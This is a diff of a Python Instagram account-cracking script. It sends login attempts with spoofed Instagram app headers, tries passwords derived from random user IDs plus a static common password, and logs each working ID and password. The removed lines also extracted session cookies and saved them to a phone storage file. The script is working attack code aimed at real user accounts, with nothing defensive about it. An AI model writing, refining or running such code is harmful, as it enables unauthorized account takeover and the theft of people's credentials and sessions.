@@ -118,7 +118,7 @@ def crack(uid, password_list, total_count):
             'x-ig-connection-type': 'MOBILE(LTE)',
             'x-ig-capabilities': '3brTv10=',
             'priority': 'u=3',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 16; SM-S931U Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 Instagram 408.0.0.51.78 Android (36/16; 540dpi; 1080x2340; samsung; SM-S931U; pa1q; qcom; en_US; 832162577; IABMV/1)',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-S906U1 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.124 Mobile Safari/537.36 Instagram 408.0.0.0.45 Android (35/15; 450dpi; 1080x2340; samsung; SM-S906U1; g0q; qcom; es_LA; 827194262; IABMV/1)',
             'accept-language': 'id-ID, en-US',
             'x-mid': '',
             'ig-intended-user-id': '0',
@@ -149,16 +149,11 @@ def crack(uid, password_list, total_count):
                 timeout=30,
                 allow_redirects=True
             )
-            wanted = ["ds_user_id", "sessionid"]
-            all_cookies = session.cookies.get_dict()
-            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
+            
             # Check response
-            if 'sessionid' in extracted:
-                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
+            if 'logged_in_user' in response.text:
                 print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                print("Cookies:", cookie_str)
-                open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
-                oks.append(uid)
+                save_success(uid, pw)
                 return True
             elif 'challenge_required' in response.text:
                 print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
@@ -217,10 +212,10 @@ def generate_random_ids(limit):
 def get_password_patterns(uid):
     """Generate password patterns based on UID"""
     return [
+        '57273200',  # Static common password
         uid[:6],     # First 6 digits
         uid[:8],     # First 8 digits
         uid,         # Full number
-        '57273200',  # Static common password
     ]
 
 def random_number():
